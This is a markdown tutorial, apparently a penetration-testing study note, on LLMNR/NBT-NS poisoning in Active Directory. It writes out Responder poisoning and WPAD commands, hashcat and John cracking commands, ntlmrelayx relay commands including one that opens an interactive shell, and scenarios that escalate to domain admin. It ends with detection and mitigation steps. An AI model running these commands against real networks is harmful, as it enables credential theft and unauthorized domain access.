# ☠️ LLMNR & NBT-NS Poisoning — Network Credential Theft in AD

**LLMNR (Link-Local Multicast Name Resolution)** and **NBT-NS (NetBIOS Name Service)** poisoning is one of the **easiest and most common** ways to capture credentials in an Active Directory network.

> When a machine fails to resolve a hostname via DNS, it falls back to LLMNR/NBT-NS broadcasts. An attacker can **respond to these broadcasts** and trick victims into sending their credentials.

---

## 🧠 How Name Resolution Works in Windows

When a Windows machine tries to reach a hostname (e.g., `\\fileserver`):

```text
1. Check local hosts file
2. Query DNS server
3. If DNS fails → LLMNR broadcast (multicast to local subnet)
4. If LLMNR fails → NBT-NS broadcast (broadcast to local subnet)
```

The vulnerability is in **steps 3 and 4**:

> Anyone on the local network can respond to LLMNR/NBT-NS queries and claim to be the requested host.

---

## 🎯 Attack Flow

```text
1. Victim types: \\fileshare (typo — doesn't exist in DNS)
2. Windows sends LLMNR/NBT-NS broadcast: "Who is fileshare?"
3. Attacker responds: "I am fileshare!"
4. Victim sends authentication (NTLMv2 hash) to attacker
5. Attacker captures the hash
6. Attacker cracks the hash offline OR relays it
```

---

## 🛠 Tools for LLMNR/NBT-NS Poisoning

---

### 1️⃣ Responder (Primary Tool)

Responder is the go-to tool for LLMNR/NBT-NS poisoning.

#### Install

```bash
git clone https://github.com/lgandx/Responder.git
cd Responder
```

#### Basic Poisoning

```bash
sudo python3 Responder.py -I eth0 -rdwv
```

Flags:

* `-I eth0` — network interface
* `-r` — enable answers for NetBIOS wredir suffix
* `-d` — enable answers for NetBIOS domain suffix
* `-w` — start WPAD rogue proxy
* `-v` — verbose mode

#### Output Example

```
[+] Listening for events...
[SMB] NTLMv2-SSP Client   : 10.0.0.50
[SMB] NTLMv2-SSP Username : CORP\jsmith
[SMB] NTLMv2-SSP Hash     : jsmith::CORP:1122334455667788:HASHDATA...
```

Hashes are saved to:

```
/usr/share/responder/logs/
```

---

### 2️⃣ Cracking Captured Hashes

#### Hashcat — NTLMv2

```bash
hashcat -m 5600 hash.txt rockyou.txt
```

#### John the Ripper

```bash
john --format=netntlmv2 hash.txt --wordlist=rockyou.txt
```

---

### 3️⃣ NTLM Relay (Instead of Cracking)

Instead of cracking, you can **relay** the captured authentication to another machine.

#### Using ntlmrelayx (Impacket)

```bash
ntlmrelayx.py -tf targets.txt -smb2support
```

Where `targets.txt` contains IPs of machines where SMB signing is **NOT enforced**.

How it works:

```text
Victim → Attacker (Responder) → Attacker relays auth to Target → Attacker gets access
```

#### Check for SMB Signing

```bash
crackmapexec smb 10.0.0.0/24 --gen-relay-list relay_targets.txt
```

This generates a list of machines without SMB signing (relay targets).

---

## 🔥 Realistic Attack Scenarios

---

### 🧨 Scenario 1: Responder on Internal Network

1. Attacker plugs into corporate network (or has VPN access).
2. Runs Responder:

   ```bash
   sudo python3 Responder.py -I eth0 -rdwv
   ```

3. Waits for someone to mistype a share name or access a non-existent host.
4. Captures NTLMv2 hash within minutes.
5. Cracks hash → gains valid domain credentials.
6. Uses credentials for lateral movement.

---

### 🧨 Scenario 2: WPAD (Web Proxy Auto-Discovery) Attack

1. Windows machines often look for `wpad.corp.local` to auto-configure proxy.
2. If WPAD DNS entry doesn't exist → LLMNR broadcast.
3. Responder responds and serves a malicious WPAD file.
4. All web traffic gets routed through attacker's proxy.
5. Credentials captured from HTTP authentication.

```bash
sudo python3 Responder.py -I eth0 -wFb
```

* `-w` — WPAD poisoning
* `-F` — force NTLM auth for WPAD
* `-b` — enable HTTP basic auth

---

### 🧨 Scenario 3: NTLM Relay to Domain Admin

1. Run Responder in **analyze mode** (don't poison, just listen):

   ```bash
   sudo python3 Responder.py -I eth0 -A
   ```

2. Identify a Domain Admin's machine making LLMNR queries.
3. Set up ntlmrelayx targeting a server:

   ```bash
   ntlmrelayx.py -t 10.0.0.20 -smb2support -i
   ```

4. Turn on Responder poisoning.
5. When DA authenticates → relay to target → get interactive shell.

---

## 📊 LLMNR vs NBT-NS vs mDNS

| Protocol | Port | Scope | IPv6 Support |
| --- | --- | --- | --- |
| LLMNR | UDP 5355 | Local subnet (multicast) | ✅ |
| NBT-NS | UDP 137 | Local subnet (broadcast) | ❌ |
| mDNS | UDP 5353 | Local subnet (multicast) | ✅ |

Responder handles all three.

---

## 🧠 Hash Types Captured

| Hash Type | Hashcat Mode | Difficulty to Crack |
| --- | --- | --- |
| NTLMv1 | 5500 | Easy |
| NTLMv2 | 5600 | Medium |
| NTLMv1-SSP | 5500 | Easy |
| NTLMv2-SSP | 5600 | Medium |

> NTLMv2 is more common in modern environments. NTLMv1 is easier to crack but less common.

---

## 🛡 Detection & Mitigation

### 🔎 Detection

* Monitor for LLMNR traffic (UDP 5355)
* Monitor for NBT-NS traffic (UDP 137)
* Detect multiple hosts responding to name queries
* Look for SMB connections to non-standard hosts
* Use honeypot shares that trigger alerts

#### Network Detection

```
Wireshark filter: llmnr || nbns
```

---

### 🔐 Mitigation

✅ **Disable LLMNR** via Group Policy:

```
Computer Configuration → Administrative Templates → Network → DNS Client
→ Turn Off Multicast Name Resolution = Enabled
```

✅ **Disable NBT-NS** on all interfaces:

```
Network Adapter → IPv4 Properties → Advanced → WINS tab
→ Disable NetBIOS over TCP/IP
```

✅ **Enable SMB Signing** on all machines (blocks relay attacks):

```
Computer Configuration → Policies → Windows Settings → Security Settings
→ Local Policies → Security Options
→ Microsoft network server: Digitally sign communications (always) = Enabled
```

✅ Use **Network Access Control (NAC)**
✅ Segment network properly
✅ Deploy **DNS records for WPAD** to prevent WPAD poisoning
✅ Use **strong passwords** that resist offline cracking

---

## 🧠 Attack Flow Summary

```text
1. Victim makes DNS query that fails
2. Victim broadcasts LLMNR/NBT-NS
3. Attacker (Responder) responds
4. Victim sends NTLMv2 hash
5. Attacker cracks hash OR relays it
6. Attacker gains domain credentials
```

---

## ⚠ Ethical Reminder

Everything discussed:

* Legal only in authorized labs
* Legal with written penetration testing authorization
* Illegal otherwise

---

## 📚 What to Learn Next

* 🔄 NTLM Relay attacks in depth
* 🧪 Setting up a lab to practice LLMNR poisoning
* 🛡 Group Policy hardening for AD networks
* 🔍 IPv6 attacks in AD environments
